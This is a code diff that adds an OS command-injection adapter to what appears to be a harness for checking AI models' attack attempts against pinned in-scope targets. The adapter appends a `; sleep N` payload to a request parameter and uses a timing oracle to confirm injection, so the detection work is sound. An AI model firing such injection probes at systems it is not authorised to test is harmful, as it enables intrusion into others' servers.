@@ -654,6 +654,63 @@ class PathAdapter(_Adapter):
         }
 
 
+class CmdiAdapter(_Adapter):
+    """OS command injection via a timing oracle against a pinned in-scope target.
+    Registered as `cmdi`.
+
+    The harness sends a baseline request and then one that appends a shell `sleep` to the
+    parameter, and reports command injection only when the injected request takes at least
+    the sleep duration longer than the baseline, which proves the server executed the
+    injected command rather than treating it as data. The delay is the harness's and it
+    measures the round-trip itself, so a model cannot forge the verdict; a server that does
+    not shell out answers both in the same time and does not fire. The Verifier reruns the
+    pair against a fresh snapshot. The round-trip clock is injected so the timing logic is
+    unit-tested without real sleeps; the live path measures the real wall clock."""
+
+    def __init__(self, attacker, pinned, *, run=None, clock=time.monotonic):
+        super().__init__(attacker, pinned, run=run)
+        self._clock = clock
+
+    def run(self, req):
+        ip = self._resolve(req["target"])
+        port = int(req["port"])
+        args = req.get("args") or {}
+        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
+        path = args.get("path", "/ping")
+        param = args.get("param", "host")
+        base = str(args.get("base", "127.0.0.1"))
+        delay_s = float(args.get("delay_s", 5))
+
+        def timed(value):
+            qs = urllib.parse.urlencode({param: value})
+            url = f"{scheme}://{ip}:{port}{path}?{qs}"
+            t0 = self._clock()
+            status_code, _ = self._send_http(url)
+            return status_code, self._clock() - t0
+
+        base_status, base_elapsed = timed(base)
+        inj_status, inj_elapsed = timed(f"{base}; sleep {int(delay_s)}")
+        delta = inj_elapsed - base_elapsed
+        hit = base_status > 0 and delta >= delay_s * 0.5          # injected sleep dominates
+        return {
+            "status": "ok" if hit else "error",
+            "parsed": {"baseline_ms": int(base_elapsed * 1000),
+                       "injected_ms": int(inj_elapsed * 1000)},
+            "request_bytes": f"cmdi {path}?{param}=...; sleep {int(delay_s)}".encode("utf-8"),
+            "response_bytes": f"baseline={base_elapsed:.3f}s injected={inj_elapsed:.3f}s".encode("utf-8"),
+            "deterministic_signals": {
+                "hit": hit,
+                "cmdi": hit,
+                "delay_s": delay_s,
+                "baseline_ms": int(base_elapsed * 1000),
+                "injected_ms": int(inj_elapsed * 1000),
+                "delta_ms": int(delta * 1000),
+                "status_code": base_status,
+                "confidence": 0.9 if hit else 0.0,
+            },
+        }
+
+
 def _parse_nmap_services(xml_text):
     """Parse nmap `-oX -` output into a list of open-port service dicts. Tolerant: any
     parse failure or no open port yields an empty list (the adapter reports no hit)."""
